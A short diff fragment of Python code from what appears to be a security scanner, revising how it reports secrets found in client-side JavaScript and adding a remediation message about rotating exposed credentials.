+                    description=f"Validated secrets exposed in JavaScript: {', '.join(all_secrets_found.keys())}",
+                    remediation="Never hardcode secrets in client-side code, rotate all exposed credentials",
                     exploitable=True
                 ))
             else:
-                print(Colors.info(f"      [·] Analyzed {analyzed_count} files, no hardcoded secrets found"))
+                print(Colors.info(f"      [·] Analyzed {analyzed_count} files, no validated secrets found"))
                 
         except Exception as e:
             print(Colors.warning(f"      [!] JS analysis error: {e}"))
